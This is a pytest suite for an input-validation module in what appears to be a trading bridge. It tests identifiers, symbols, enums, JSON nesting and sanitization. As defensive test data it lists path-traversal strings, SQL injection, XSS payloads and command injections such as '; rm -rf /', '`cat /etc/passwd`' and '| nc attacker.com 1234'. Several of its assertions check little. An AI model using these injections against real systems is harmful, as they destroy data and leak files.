"""
Comprehensive validation tests for bridge validation module.

Tests cover:
- File path validation edge cases
- Trading symbol validation
- Deep JSON nesting limits
- Validation middleware
- Input sanitization
"""

import json
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

# Try to import validation module
try:
    from bridge.validation import (
        validate_text_input,
        validate_identifier,
        validate_enum_value,
        validate_json_input,
        ValidationError
    )
    VALIDATION_AVAILABLE = True
except ImportError:
    VALIDATION_AVAILABLE = False


@pytest.mark.skipif(not VALIDATION_AVAILABLE, reason="Validation module not available")
class TestFilePathValidation:
    """Test file path validation edge cases."""

    def test_path_with_directory_traversal(self):
        """Test rejection of directory traversal attempts."""
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "..\\..\\windows\\system32",
            "foo/../../../bar",
        ]

        for path in dangerous_paths:
            # Identifier validation should reject these
            with pytest.raises(ValidationError):
                validate_identifier(path, field_name="path")

    def test_path_with_special_characters(self):
        """Test handling of special characters in identifiers."""
        special_chars = [
            "file<name>",
            "file|name",
            "file\x00name",
            "file\nname",
        ]

        for name in special_chars:
            with pytest.raises(ValidationError):
                validate_identifier(name, field_name="filename")

    def test_valid_identifier_formats(self):
        """Test valid identifier formats are accepted."""
        valid_identifiers = [
            "simple_name",
            "name-with-dashes",
            "name123",
            "CamelCase",
            "snake_case_name",
        ]

        for identifier in valid_identifiers:
            result = validate_identifier(identifier, field_name="test")
            assert result == identifier

    def test_identifier_max_length(self):
        """Test identifier length limits."""
        # Very long identifier
        long_id = "a" * 500

        with pytest.raises(ValidationError):
            validate_identifier(long_id, field_name="id")

    def test_empty_identifier_rejected(self):
        """Test empty identifiers are rejected."""
        with pytest.raises(ValidationError):
            validate_identifier("", field_name="id")

    def test_whitespace_only_identifier_rejected(self):
        """Test whitespace-only identifiers are rejected."""
        with pytest.raises(ValidationError):
            validate_identifier("   ", field_name="id")


@pytest.mark.skipif(not VALIDATION_AVAILABLE, reason="Validation module not available")
class TestTradingSymbolValidation:
    """Test trading symbol validation patterns."""

    @pytest.mark.parametrize("symbol", [
        "BTC/USDT",
        "ETH/USD",
        "DOGE/EUR",
        "SOL/BTC",
        "XRP/USDT",
    ])
    def test_valid_trading_symbols(self, symbol):
        """Test valid trading symbol formats are accepted."""
        # Trading symbols should pass text input validation
        result = validate_text_input(symbol, max_length=20, field_name="symbol")
        assert result == symbol

    @pytest.mark.parametrize("invalid_symbol", [
        "",  # Empty
        "A" * 100,  # Too long for symbol
    ])
    def test_invalid_trading_symbol_lengths(self, invalid_symbol):
        """Test invalid trading symbol lengths."""
        if invalid_symbol == "":
            with pytest.raises(ValidationError):
                validate_text_input(invalid_symbol, max_length=20, field_name="symbol")
        else:
            with pytest.raises(ValidationError):
                validate_text_input(invalid_symbol, max_length=20, field_name="symbol")

    def test_trading_symbol_with_injection(self):
        """Test trading symbols with injection attempts."""
        injection_attempts = [
            "BTC/USDT; DROP TABLE",
            "ETH<script>alert(1)</script>",
            "SOL${whoami}",
        ]

        for symbol in injection_attempts:
            # These should be rejected or sanitized
            result = validate_text_input(symbol, max_length=100, field_name="symbol")
            # The validation should either reject or sanitize
            assert "<script>" not in result
            assert "DROP TABLE" not in result or ";" not in result


@pytest.mark.skipif(not VALIDATION_AVAILABLE, reason="Validation module not available")
class TestDeepNestingValidation:
    """Test deep JSON nesting limits."""

    def test_acceptable_nesting_depth(self):
        """Test JSON with acceptable nesting depth."""
        # 5 levels of nesting
        nested = {"a": {"b": {"c": {"d": {"e": "value"}}}}}
        json_str = json.dumps(nested)

        # Should not raise
        result = validate_text_input(json_str, max_length=1000, field_name="json")
        assert result == json_str

    def test_deeply_nested_json_string(self):
        """Test deeply nested JSON as string input."""
        # Create 15 levels of nesting
        deep = "value"
        for i in range(15):
            deep = {f"level_{i}": deep}

        json_str = json.dumps(deep)

        # Should still pass basic text validation
        result = validate_text_input(json_str, max_length=10000, field_name="json")
        assert len(result) > 0

    def test_array_nesting(self):
        """Test array nesting limits."""
        # Nested arrays
        nested = [[[[["deep"]]]]]
        json_str = json.dumps(nested)

        result = validate_text_input(json_str, max_length=1000, field_name="json")
        assert result == json_str


@pytest.mark.skipif(not VALIDATION_AVAILABLE, reason="Validation module not available")
class TestTextInputValidation:
    """Test text input validation."""

    def test_text_max_length_enforcement(self):
        """Test text max length is enforced."""
        long_text = "a" * 1000

        with pytest.raises(ValidationError):
            validate_text_input(long_text, max_length=100, field_name="text")

    def test_text_at_max_length(self):
        """Test text exactly at max length is accepted."""
        exact_length = "a" * 100

        result = validate_text_input(exact_length, max_length=100, field_name="text")
        assert result == exact_length

    def test_unicode_text_handling(self):
        """Test Unicode text is handled correctly."""
        unicode_text = "Hello 世界 🌍 مرحبا"

        result = validate_text_input(unicode_text, max_length=100, field_name="text")
        assert result == unicode_text

    def test_control_characters_handling(self):
        """Test control characters in text."""
        text_with_controls = "hello\x00world\x1f"

        # Control characters should be handled
        result = validate_text_input(text_with_controls, max_length=100, field_name="text")
        # Result should not contain null bytes
        assert "\x00" not in result

    def test_html_in_text(self):
        """Test HTML in text input."""
        html_text = "<script>alert('xss')</script>"

        # Should either reject or sanitize
        result = validate_text_input(html_text, max_length=100, field_name="text")
        # Script tags should be handled
        assert "alert" not in result.lower() or "<script>" not in result.lower()


@pytest.mark.skipif(not VALIDATION_AVAILABLE, reason="Validation module not available")
class TestEnumValidation:
    """Test enum value validation."""

    def test_valid_enum_value(self):
        """Test valid enum values are accepted."""
        allowed = ["gen", "act", "auto"]

        for value in allowed:
            result = validate_enum_value(value, allowed, field_name="route")
            assert result == value

    def test_invalid_enum_value(self):
        """Test invalid enum values are rejected."""
        allowed = ["gen", "act", "auto"]

        with pytest.raises(ValidationError):
            validate_enum_value("invalid", allowed, field_name="route")

    def test_case_sensitive_enum(self):
        """Test enum validation is case-sensitive."""
        allowed = ["Gen", "Act", "Auto"]

        # Lowercase should fail if not in allowed
        with pytest.raises(ValidationError):
            validate_enum_value("gen", allowed, field_name="route")

    def test_empty_enum_value(self):
        """Test empty enum value is rejected."""
        allowed = ["gen", "act", "auto"]

        with pytest.raises(ValidationError):
            validate_enum_value("", allowed, field_name="route")

    def test_none_enum_value(self):
        """Test None enum value handling."""
        allowed = ["gen", "act", "auto"]

        with pytest.raises((ValidationError, TypeError)):
            validate_enum_value(None, allowed, field_name="route")


@pytest.mark.skipif(not VALIDATION_AVAILABLE, reason="Validation module not available")
class TestInputSanitization:
    """Test input sanitization functions."""

    def test_sql_injection_patterns(self):
        """Test SQL injection patterns are handled."""
        sql_patterns = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "UNION SELECT * FROM passwords",
        ]

        for pattern in sql_patterns:
            # Should not crash, may sanitize
            result = validate_text_input(pattern, max_length=200, field_name="input")
            assert isinstance(result, str)

    def test_command_injection_patterns(self):
        """Test command injection patterns are handled."""
        cmd_patterns = [
            "; rm -rf /",
            "$(whoami)",
            "`cat /etc/passwd`",
            "| nc attacker.com 1234",
        ]

        for pattern in cmd_patterns:
            result = validate_text_input(pattern, max_length=200, field_name="input")
            # Should handle these patterns
            assert isinstance(result, str)

    def test_xss_patterns(self):
        """Test XSS patterns are handled."""
        xss_patterns = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
        ]

        for pattern in xss_patterns:
            result = validate_text_input(pattern, max_length=200, field_name="input")
            # Script execution should not be possible
            assert isinstance(result, str)


@pytest.mark.skipif(not VALIDATION_AVAILABLE, reason="Validation module not available")
class TestValidationErrorMessages:
    """Test validation error messages are informative."""

    def test_error_includes_field_name(self):
        """Test error message includes field name."""
        try:
            validate_text_input("", max_length=100, field_name="my_field")
        except ValidationError as e:
            assert "my_field" in str(e)

    def test_error_includes_constraint_info(self):
        """Test error message includes constraint information."""
        try:
            validate_text_input("a" * 200, max_length=100, field_name="text")
        except ValidationError as e:
            # Should mention length constraint
            error_str = str(e).lower()
            assert "length" in error_str or "100" in error_str or "max" in error_str

    def test_error_does_not_leak_sensitive_data(self):
        """Test error messages don't leak sensitive input."""
        sensitive_input = "password=secret123"

        try:
            validate_identifier(sensitive_input, field_name="input")
        except ValidationError as e:
            # Error should not contain the password value
            assert "secret123" not in str(e)


@pytest.mark.skipif(not VALIDATION_AVAILABLE, reason="Validation module not available")
class TestEdgeCases:
    """Test edge cases in validation."""

    def test_very_long_field_name(self):
        """Test handling of very long field names."""
        long_field = "a" * 1000

        # Should not crash
        try:
            validate_text_input("test", max_length=100, field_name=long_field)
        except Exception:
            pass  # Error handling is acceptable

    def test_negative_max_length(self):
        """Test handling of negative max length."""
        # Should handle gracefully
        try:
            validate_text_input("test", max_length=-1, field_name="field")
        except (ValidationError, ValueError):
            pass  # Expected

    def test_zero_max_length(self):
        """Test handling of zero max length."""
        with pytest.raises(ValidationError):
            validate_text_input("any", max_length=0, field_name="field")

    def test_whitespace_variations(self):
        """Test various whitespace inputs."""
        whitespace_inputs = [
            " ",
            "\t",
            "\n",
            "\r\n",
            "  \t\n  ",
        ]

        for ws in whitespace_inputs:
            # Most should be rejected as empty after stripping
            result = validate_text_input(ws, max_length=100, field_name="text")
            # Either rejected or stripped
            assert result.strip() == "" or isinstance(result, str)

    def test_mixed_encoding_text(self):
        """Test text with mixed encodings."""
        mixed = "Hello Héllo Прівет 你好"

        result = validate_text_input(mixed, max_length=100, field_name="text")
        assert result == mixed

    def test_emoji_handling(self):
        """Test emoji in text input."""
        emoji_text = "Hello 👋 World 🌍 Test 🎉"

        result = validate_text_input(emoji_text, max_length=100, field_name="text")
        assert "👋" in result or result == emoji_text
